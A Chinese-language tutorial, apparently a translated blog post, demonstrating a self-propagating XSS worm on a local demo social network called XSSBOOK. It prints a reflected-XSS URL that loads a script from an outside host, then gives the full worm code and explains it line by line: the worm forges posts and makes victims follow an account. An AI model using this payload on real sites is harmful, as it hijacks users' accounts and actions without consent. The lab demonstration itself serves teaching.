我们以一个数据集合开始产生一个XSSBOOK的数据库。

![enter description here][1]

和传统社交网络一样，只有极少用户能够拥有大量的听众。为了方便演示，这里我们产生了一百个用户，他们都有同样的密码12345678。

其中，“Brute”是最后一个用户。

![enter description here][2]

XSSBOOK这个应用看起来是这个样子的。

![enter description here][3]

首页显示了收听的用户所发表的信息。在上面的截图当中，Brute收听了Angela并且看到Angela最近的推文。他的资料页展示了他的听众数量（目前是0）和自我介绍。Brute还没有发表过推文所以没有显示。

蠕虫传播的开始，第一个受到感染的是George。他因为访问了一个通过搜索功能存在的反射型xss漏洞构造的蠕虫而受到感染：

```
http://localhost/xssbook/search.php?user=%3Cscript%20src=//brutelogic.com.br/tmp/xssbook.js%3E%3C/script%3E
```

引入的js的内容为

```
x = new XMLHttpRequest();
x.open('POST', 'home.php', true);
x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
x.send('post=</textarea><br><a href="' + document.URL + '">Check this!</a>');

fr = document.createElement('iframe');
fr.setAttribute('name', 'myFrame');
fr.setAttribute('style', 'display:none');
document.body.appendChild(fr);

fo = document.createElement('form');
fo.setAttribute('method', 'post');
fo.setAttribute('action', 'profile.php?id=100');
fo.setAttribute('target', 'myFrame');

i = document.createElement('input');
i.setAttribute('type', 'hidden');
i.setAttribute('name', 'follow');
fo.appendChild(i);

fo.elements[0].value='follow';

document.body.appendChild(fo);

fo.submit();
```
解析一下这段js

```
x = new XMLHttpRequest();
x.open('POST', 'home.php', true);
x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
x.send('post=</textarea><br><a href="' + document.URL + '">Check this!</a>');
```

开头四行是蠕虫的自我传播部分，它在用户不知情的情况下发送了一条推文，推文的内容首先闭合了
textarea标签，插入了一个换行符，再插入了一个指向当前页面（即蠕虫传播）的链接。

```
fr = document.createElement(‘iframe’);
fr.setAttribute(‘name’, ‘myFrame’);
fr.setAttribute(‘style’, ‘display:none’);
document.body.appendChild(fr);

```
这四行我们创建了个看不见的iframe，这个iframe将会成为接下来蠕虫要创建的form的target（这样做的目的见上文）。

```
fo = document.createElement('form');
fo.setAttribute('method', 'post');
fo.setAttribute('action', 'profile.php?id=100');
fo.setAttribute('target', 'myFrame');
```

这四行代码创建了一个form，target是之前的iframe，目标页面是100号用户的个人资料，也就是brute用户的个人资料页面。

```
i = document.createElement(‘input’);
i.setAttribute(‘type’, ‘hidden’);
i.setAttribute(‘name’, ‘follow’);
fo.appendChild(i);
```

这里创建了个不可见的input块，目的在于post一个follow的值，

```
fo.elements[0].value='follow';
```

而follow的值也被设定为follow

```
document.body.appendChild(fo);
```
form被加入到页面中

```
fo.submit();
```
form最终被提交。

如我们所见，这段蠕虫代码将会复制自身，传播自身，并且关注用户“Brute”

所以我们现在有一个100人规模的社交网络，连接数为463。我们现在要看看蠕虫在用户间的传播。为了达到这个目的我们将使用Firefox扩展Selenium IDE。

![enter description here][4]

我们使用该扩展模拟用户的行为，通过给定的csv表格中的帐号信息陆续登录账户，点击timeline上的链接。接下来我们就可看到该蠕虫的快速传播。

演示视频（须翻墙）

%[enter description here][5]


  [1]: images/xssbook-1.png "xssbook-1.png"
  [2]: images/xssbook-3.png "xssbook-3.png"
  [3]: images/xssbook-screens.png "xssbook-screens.png"
  [4]: images/xssbook-2.png "xssbook-2.png"
  [5]: https://www.youtube.com/embed/i8mTYicEQrI?version=3&rel=1&fs=1&autohide=2&showsearch=0&showinfo=1&iv_load_policy=1&wmode=transparent
